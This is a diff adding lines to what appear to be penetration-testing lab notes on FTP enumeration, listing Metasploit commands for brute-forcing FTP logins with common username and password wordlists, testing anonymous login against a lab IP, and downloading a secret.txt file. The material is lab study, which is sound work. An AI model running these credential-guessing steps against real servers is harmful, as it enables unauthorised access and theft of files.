@@ -119,3 +119,21 @@ NOTE: FTP authentication utilizes a username and password combination, however, 
 - `run` = ![image](https://github.com/user-attachments/assets/eab00222-7a14-4ba3-ad0b-1c8a07c48fcf)
 
 **Enumorate Brutforce module**
+- `use auxiliary/scanner/ftp/ftp_login`
+- `options`
+- `set RHOST 192.94.227.3`
+- `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt` set the most common usernames
+- `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` set the most common passwords
+- `run`
+
+**FTP Anonymous Login Module**
+- `search type:auxiliary name:ftp`
+- `use auxiliary/scanner/ftp/anonymous`
+- `options`
+- `set RHOST 192.94.227.3`
+- `run`
+- In our case id didn`t work
+- `exit`
+- `ftp 192.94.227.3` connect to ftp, afterwards type in user and password
+- `get secret.txt`
+- `cat secret.txt`
